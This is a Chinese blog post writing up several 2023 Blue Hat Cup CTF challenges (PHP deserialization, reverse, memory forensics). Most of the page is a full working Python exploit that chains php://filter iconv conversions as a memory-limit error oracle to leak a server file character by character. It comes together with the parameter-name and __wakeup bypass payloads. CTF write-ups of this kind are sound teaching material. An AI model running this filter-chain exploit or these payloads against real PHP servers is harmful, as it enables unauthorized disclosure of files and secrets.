<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2023蓝帽杯初赛ctf部分题目 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2023蓝帽杯初赛ctf部分题目" />
<meta property="og:description" content="Web LovePHP 打开网站环境，发现显示出源码
来可以看到php版本是7.4.33
简单分析了下，主要是道反序列化的题其中发现get传入的参数里有_号是非法字符，如果直接传值传入my_secret.flag，会被php处理掉
绕过 _ 的方法 对于__可以使用[,空格，&#43;，.。都会被处理为_; 这是因为当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_ 所以用my]secret.flag来传就可以，之后就是看反序列化了，这里主要关注的是需要绕过wakeup方法，在一篇文章中发现了可以绕过php版本7.4.33的wakeup函数
使用C绕过 当开头添加为c的时候，只能执行destruct函数，无法添加任何方法所以我们直接用C:8:&#34;Saferman&#34;:0:{}就可以了
PHP反序列化中wakeup()绕过总结 – fushulingのblog 之后确发现无法打印出flag，然后一直再试其他的也没有找到回显的地方，最后在file函数上找到了方法
侧信道攻击 侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现。而这里的file函数里面是可以用filter伪协议的
我就直接利用大佬的脚本搞了一下，通过构造fliter链子，不断的请求内存区域的同一块资源区，通过判断彼此之间服务器响应的时间差值，来得到最终的flag
Webの侧信道初步认识 | Boogiepop Doesn&#39;t Laugh (boogipop.com)
import requests import sys from base64 import b64decode &#34;&#34;&#34; THE GRAND IDEA: We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE filter will blow up the string length by 4x every time it is used, which will quickly cause 500 error if and only if the string is non empty." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/a7e9687dd1939a2b38d0f2082f98e1ae/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-29T11:21:14+08:00" />
<meta property="article:modified_time" content="2023-08-29T11:21:14+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2023蓝帽杯初赛ctf部分题目</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 style="margin-left:0px;text-align:justify;"><span style="background-color:#ffffff;"><span style="color:#313131;">Web</span></span></h2> 
<h4 style="margin-left:0px;text-align:justify;"><span style="background-color:#ffffff;"><span style="color:#313131;">LovePHP</span></span></h4> 
<p style="margin-left:0;text-align:justify;">打开网站环境，发现显示出源码</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="476" src="https://images2.imgbox.com/9e/af/ve0Tavr9_o.png" width="865"></p> 
<p> 来可以看到php版本是7.4.33</p> 
<p><img alt="" height="577" src="https://images2.imgbox.com/46/ca/aX6qE0mW_o.png" width="865"></p> 
<p>简单分析了下，主要是道反序列化的题其中发现get传入的参数里有_号是非法字符，如果直接传值传入my_secret.flag，会被php处理掉</p> 
<p><strong><span style="color:#1f0909;">绕过</span></strong><strong><span style="color:#1f0909;"> _ </span></strong><strong><span style="color:#1f0909;">的方法</span></strong><strong>    </strong><span style="color:#1f0909;">对于</span><span style="color:#1f0909;">__</span><span style="color:#1f0909;">可以使用</span><span style="color:#1f0909;">[,</span><span style="color:#1f0909;">空格，</span><span style="color:#1f0909;">+</span><span style="color:#1f0909;">，</span><span style="color:#1f0909;">.</span><span style="color:#1f0909;">。都会被处理为</span><span style="color:#1f0909;">_;  </span><span style="color:#1f0909;">这是因为当</span><span style="color:#1f0909;">PHP</span><span style="color:#1f0909;">版本小于</span><span style="color:#1f0909;">8</span><span style="color:#1f0909;">时，如果参数中出现中括号</span><span style="color:#1f0909;">[</span><span style="color:#1f0909;">，中括号会被转换成下划线</span><span style="color:#1f0909;">_</span><span style="color:#1f0909;">，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线</span><span style="color:#1f0909;">_</span><span style="color:#1f0909;">，也就是说如果中括号</span><span style="color:#1f0909;">[</span><span style="color:#1f0909;">出现在前面，那么中括号</span><span style="color:#1f0909;">[</span><span style="color:#1f0909;">还是会被转换成下划线</span><span style="color:#1f0909;">_</span><span style="color:#1f0909;">，但是因为出错导致接下来的非法字符并不会被转换成下划线</span><span style="color:#1f0909;">_</span> </p> 
<p style="margin-left:0;text-align:left;"><span style="color:#1f0909;">所以用</span>my]secret.flag来传就可以，之后就是看反序列化了，这里主要关注的是需要绕过wakeup方法，在一篇文章中发现了可以绕过php版本7.4.33的wakeup函数</p> 
<h5 style="margin-left:0;text-align:justify;"></h5> 
<p style="margin-left:0px;text-align:justify;"><strong>使用C绕过</strong>       当开头添加为c的时候，只能执行destruct函数，无法添加任何方法所以我们直接用C:8:"Saferman":0:{}就可以了</p> 
<pre style="margin-left:.0001pt;"><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" rel="nofollow" title="PHP反序列化中wakeup()绕过总结 – fushulingのblog">PHP反序列化中wakeup()绕过总结 – fushulingのblog</a>
</pre> 
<p style="margin-left:0;text-align:left;">之后确发现无法打印出flag，然后一直再试其他的也没有找到回显的地方，最后在file函数上找到了方法</p> 
<p style="margin-left:0cm;"><strong>侧信道攻击 </strong>    侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现。而这里的file函数里面是可以用filter伪协议的</p> 
<p style="margin-left:0cm;">我就直接利用大佬的脚本搞了一下，通过构造fliter链子，不断的请求内存区域的同一块资源区，通过判断彼此之间服务器响应的时间差值，来得到最终的flag</p> 
<p style="margin-left:0cm;"><a href="https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/" rel="nofollow" title="Webの侧信道初步认识 | Boogiepop Doesn't Laugh (boogipop.com)">Webの侧信道初步认识 | Boogiepop Doesn't Laugh (boogipop.com)</a></p> 
<pre><code class="language-python">import requests
import sys
from base64 import b64decode

"""
THE GRAND IDEA:
We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
filter will blow up the string length by 4x every time it is used, which will quickly cause
500 error if and only if the string is non empty. So we now have an oracle that tells us if
the string is empty.

THE GRAND IDEA 2:
The dechunk filter is interesting.
https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
It looks like it was implemented for something http related, but for our purposes, the interesting
behavior is that if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
above oracle! In fact we can verify that since the flag starts with D that the filter chain

dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE

does not cause a 500 error.

THE REST:
So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
into madness trying to figure out ways to:
- somehow get other characters not at the start of the flag file to the front
- detect more precisely which character is at the front
"""

def join(*x):
   return '|'.join(x)

def err(s):
   print(s)
   raise ValueError

def req(s):
   data = f'php://filter/{s}/resource=/flag'
   return requests.get('http:///?my[secret.flag=C:8:"Saferman":0:{}&amp;secret='+data).status_code == 500

"""
Step 1:
The second step of our exploit only works under two conditions:
- String only contains a-zA-Z0-9
- String ends with two equals signs

base64-encoding the flag file twice takes care of the first condition.

We don't know the length of the flag file, so we can't be sure that it will end with two equals
signs.

Repeated application of the convert.quoted-printable-encode will only consume additional
memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
If the double-base64 does not end with two equals signs, we will add junk data to the start of the
flag with convert.iconv..CSISO2022KR until it does.
"""

blow_up_enc = join(*['convert.quoted-printable-encode']*1000)
blow_up_utf32 = 'convert.iconv.L1.UCS-4LE'
blow_up_inf = join(*[blow_up_utf32]*50)

header = 'convert.base64-encode|convert.base64-encode'

# Start get baseline blowup
print('Calculating blowup')
baseline_blowup = 0
for n in range(100):
   payload = join(*[blow_up_utf32]*n)
   if req(f'{header}|{payload}'):
      baseline_blowup = n
      break
else:
   err('something wrong')

print(f'baseline blowup is {baseline_blowup}')

trailer = join(*[blow_up_utf32]*(baseline_blowup-1))

assert req(f'{header}|{trailer}') == False

print('detecting equals')
j = [
   req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),
   req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),
   req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')
]
print(j)
if sum(j) != 2:
   err('something wrong')
if j[0] == False:
   header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[1] == False:
   header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'
elif j[2] == False:
   header = f'convert.base64-encode|convert.base64-encode'
else:
   err('something wrong')
print(f'j: {j}')
print(f'header: {header}')

"""
Step two:
Now we have something of the form
[a-zA-Z0-9 things]==

Here the pain begins. For a long time I was trying to find something that would allow me to strip
successive characters from the start of the string to access every character. Maybe something like
that exists but I couldn't find it. However, if you play around with filter combinations you notice
there are filters that *swap* characters:

convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
abcdefgh -&gt; badcfehg

convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
abcdefgh -&gt; dcbahgfe

This allows us to access the first four characters of the string. Can we do better? It turns out
YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of
the string:

abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh

The idea being that if we now use the r4 gadget, we get something like:
ba&lt;0xfe&gt;&lt;0xff&gt;fedc

And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
&lt;0xfe&gt;&lt;0xff&gt; to get:
bafedc

And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
characters of the string. There's only one problem: our r4 gadget requires that the string length
is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
turns out, if we apply the filter
convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7

It will turn the == into:
+---AD0-3D3D+---AD0-3D3D

And this is magic, because this corrects such that when we apply the
convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!

Let's recap. We have a string like:
abcdefghij==

Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply convert.iconv.CSUNICODE.CSUNICODE:
&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply r4 gadget:
ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3

Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
bafedcjihg+0DAD3D3+0DAD3Dw==

Then apply r4 once more:
efabijcd0+gh3DAD0+3D3DAD==wD

And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
the string still has two equals signs in it, so we can reapply the technique as many times as we
want, to access all the characters in the string ;)
"""

flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
r2 = "convert.iconv.CSUNICODE.UCS-2BE"
r4 = "convert.iconv.UCS-4LE.10646-1:1993"

def get_nth(n):
   global flip, r2, r4
   o = []
   chunk = n // 2
   if chunk % 2 == 1: o.append(r4)
   o.extend([flip, r4] * (chunk // 2))
   if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
   return join(*o)

"""
Step 3:
This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
I just bruteforced every combination of iconv filters to find these.

Numbers are a bit trickier because iconv doesn't tend to touch them.
In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
want a full leak you can base64 encode a third time and use the first two letters of the resulting
string to figure out which number it is.
"""

rot1 = 'convert.iconv.437.CP930'
be = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
o = ''

def find_letter(prefix):
   if not req(f'{prefix}|dechunk|{blow_up_inf}'):
      # a-f A-F 0-9
      if not req(f'{prefix}|{rot1}|dechunk|{blow_up_inf}'):
         # a-e
         for n in range(5):
            if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
               return 'edcba'[n]
               break
         else:
            err('something wrong')
      elif not req(f'{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
         # A-E
         for n in range(5):
            if req(f'{prefix}|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
               return 'EDCBA'[n]
               break
         else:
            err('something wrong')
      elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):
         return '*'
      elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
         # f
         return 'f'
      elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
         # F
         return 'F'
      else:
         err('something wrong')
   elif not req(f'{prefix}|string.rot13|dechunk|{blow_up_inf}'):
      # n-s N-S
      if not req(f'{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}'):
         # n-r
         for n in range(5):
            if req(f'{prefix}|string.rot13|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
               return 'rqpon'[n]
               break
         else:
            err('something wrong')
      elif not req(f'{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
         # N-R
         for n in range(5):
            if req(f'{prefix}|string.rot13|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
               return 'RQPON'[n]
               break
         else:
            err('something wrong')
      elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
         # s
         return 's'
      elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
         # S
         return 'S'
      else:
         err('something wrong')
   elif not req(f'{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
      # i j k
      if req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'k'
      elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'j'
      elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'i'
      else:
         err('something wrong')
   elif not req(f'{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
      # I J K
      if req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'K'
      elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'J'
      elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'I'
      else:
         err('something wrong')
   elif not req(f'{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
      # v w x
      if req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'x'
      elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'w'
      elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'v'
      else:
         err('something wrong')
   elif not req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
      # V W X
      if req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'X'
      elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'W'
      elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
         return 'V'
      else:
         err('something wrong')
   elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
      # Z
      return 'Z'
   elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
      # z
      return 'z'
   elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
      # M
      return 'M'
   elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
      # m
      return 'm'
   elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
      # y
      return 'y'
   elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
      # Y
      return 'Y'
   elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
      # l
      return 'l'
   elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
      # L
      return 'L'
   elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
      # h
      return 'h'
   elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
      # H
      return 'H'
   elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
      # u
      return 'u'
   elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
      # U
      return 'U'
   elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
      # g
      return 'g'
   elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
      # G
      return 'G'
   elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
      # t
      return 't'
   elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
      # T
      return 'T'
   else:
      err('something wrong')

print()
for i in range(100):
   prefix = f'{header}|{get_nth(i)}'
   letter = find_letter(prefix)
   # it's a number! check base64
   if letter == '*':
      prefix = f'{header}|{get_nth(i)}|convert.base64-encode'
      s = find_letter(prefix)
      if s == 'M':
         # 0 - 3
         prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
         ss = find_letter(prefix)
         if ss in 'CDEFGH':
            letter = '0'
         elif ss in 'STUVWX':
            letter = '1'
         elif ss in 'ijklmn':
            letter = '2'
         elif ss in 'yz*':
            letter = '3'
         else:
            err(f'bad num ({ss})')
      elif s == 'N':
         # 4 - 7
         prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
         ss = find_letter(prefix)
         if ss in 'CDEFGH':
            letter = '4'
         elif ss in 'STUVWX':
            letter = '5'
         elif ss in 'ijklmn':
            letter = '6'
         elif ss in 'yz*':
            letter = '7'
         else:
            err(f'bad num ({ss})')
      elif s == 'O':
         # 8 - 9
         prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
         ss = find_letter(prefix)
         if ss in 'CDEFGH':
            letter = '8'
         elif ss in 'STUVWX':
            letter = '9'
         else:
            err(f'bad num ({ss})')
      else:
         err('wtf')

   print(end=letter)
   o += letter
   sys.stdout.flush()

"""
We are done!! :)
"""

print()
d = b64decode(o.encode() + b'=' * 4)
# remove KR padding
d = d.replace(b'$)C',b'')
print(b64decode(d))</code></pre> 
<p style="margin-left:0;text-align:justify;">最后跑一下就出来了</p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<p style="margin-left:0;text-align:justify;"></p> 
<h2 style="margin-left:0px;text-align:justify;"><span style="background-color:#f9fbff;"><span style="color:#545454;">Reverse</span></span></h2> 
<h4 style="margin-left:0px;text-align:justify;"><span style="background-color:#ffffff;"><span style="color:#313131;">Story</span></span></h4> 
<p style="margin-left:0;text-align:justify;">属于是非预期解，看这个src.cpp文件</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="163" src="https://images2.imgbox.com/c6/bc/BWalvPrh_o.png" width="865"></p> 
<p>打开后在里面搜索发现到了flag，两部分拼接起来就是</p> 
<p><img alt="" height="633" src="https://images2.imgbox.com/f7/a4/G5gDPUbj_o.png" width="865"></p> 
<p></p> 
<p></p> 
<p></p> 
<h2>Misc</h2> 
<h4> <span style="background-color:#ffffff;"><span style="color:#313131;">ez_Forensics</span></span></h4> 
<p style="margin-left:0;text-align:justify;"><span style="background-color:#ffffff;"><span style="color:#313131;">一个镜像内存，用</span></span>passwirekit直接梭内存镜像，发现了前半段flag</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="652" src="https://images2.imgbox.com/2f/84/S3pRfiRX_o.png" width="865"></p> 
<p>然后我们就需要找到后半段flag，先用弘联的内存工具看看有没有什么信息，这里在环境变量中找到一个secret，怀疑是aes加密</p> 
<p><img alt="" height="464" src="https://images2.imgbox.com/e1/c2/yE9v8H5b_o.png" width="865"> 内存镜像的常规操作看看有哪些文件</p> 
<p style="margin-left:0;text-align:justify;">volatility.exe -f mem.raw --profile=Win7SP1x64 filescan | findstr -E "txt"</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="397" src="https://images2.imgbox.com/79/fb/FrMxUehN_o.png" width="865"></p> 
<p style="margin-left:0;text-align:justify;">我们看一下它电脑桌面上有哪些东西：</p> 
<p style="margin-left:0;text-align:justify;">volatility.exe -f mem.raw --profile=Win7SP1x64 filescan | findstr  "Desktop"</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="404" src="https://images2.imgbox.com/03/62/G7m5RJGz_o.png" width="865"></p> 
<p style="margin-left:0;text-align:left;">提取出上边的table.zip、readme.txt和key.rsmr（Mouse and Keyboard Recorder的文件）</p> 
<p style="margin-left:0;text-align:left;"><span style="background-color:#ffffff;"><span style="color:#000000;">通过 dumpfiles 命令可以将指定文件导出（以readme.txt为例）：</span></span></p> 
<p style="margin-left:0;text-align:left;"><span style="background-color:#ffffff;"><span style="color:#000000;">volatility.exe -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e434590 -D ./</span></span></p> 
<p style="margin-left:0;text-align:justify;">vol.py -f /home/leo/桌面/volatility-master/mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e434590 -D ./</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="317" src="https://images2.imgbox.com/16/e2/WlFlUyHX_o.png" width="865"></p> 
<p style="margin-left:0;text-align:left;">将readme.txt压缩发现crc32值和table.zip中的readme.txt值不同，猜测肯定是修改了readme.txt文件中的内容，于是我们看一下曾经编辑过哪些文件，查看内存中记事本的内容volatility.exe -f mem.raw --profile=Win7SP1x64 editbox</p> 
<p style="margin-left:0;text-align:left;">发现undoBuf(撤销缓冲区)：This is table to get the key修改为了Do you think I will leave the content of readme.txt for you to make the know-plaintext attack?</p> 
<p style="margin-left:0;text-align:left;"><img alt="" height="431" src="https://images2.imgbox.com/2e/73/XTNngz5Z_o.png" width="865"></p> 
<p style="margin-left:0;text-align:justify;">因此将readme.txt内容修改为This is table to get the key，再将其压缩为readme.zip</p> 
<p style="margin-left:0;text-align:justify;">用明文攻击解密得到未加密压缩包（这里一开始一直不对，后面只有用360zip压缩才可以用ARCHPR进行文明攻击）</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="569" src="https://images2.imgbox.com/ae/e8/wTi0jUap_o.png" width="703"></p> 
<p>里面有一个table</p> 
<p><img alt="" height="418" src="https://images2.imgbox.com/40/17/kbnqzCxr_o.png" width="865"></p> 
<p style="margin-left:0;text-align:justify;">用十六进制编辑器查看一下，很明显是一张PNG图片</p> 
<p style="margin-left:0;text-align:justify;">修改后缀得到</p> 
<p style="margin-left:0;text-align:justify;"><img alt="" height="638" src="https://images2.imgbox.com/43/82/ugIHkF6b_o.png" width="865"></p> 
<p>用google下载Mouse and Keyboard Recorder并且用它打开key.rsmr文件，同时打开电脑的画图工具，让Mouse and Keyboard Recorder工具在上边画出鼠标记录的信息</p> 
<p><img alt="" height="351" src="https://images2.imgbox.com/c6/ef/Vis1TSjs_o.png" width="865"></p> 
<p style="margin-left:0;text-align:justify;">根据画圈的顺序，再参考table.png，得到key是a91e37bf</p> 
<p style="margin-left:0;text-align:justify;">最后来一个aes解密即可得到剩下一部分的flag</p> 
<p> <img alt="" height="179" src="https://images2.imgbox.com/05/e3/TVjruoGv_o.png" width="865"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c3ef062507d827dff2f8a7f365b7bd69/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">antd vue table表格实现拖拽排序</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2eca09df9c7fce79ceea50a6c4f88c19/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【面试精品】关于面试会遇到的Apache相关的面试题</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>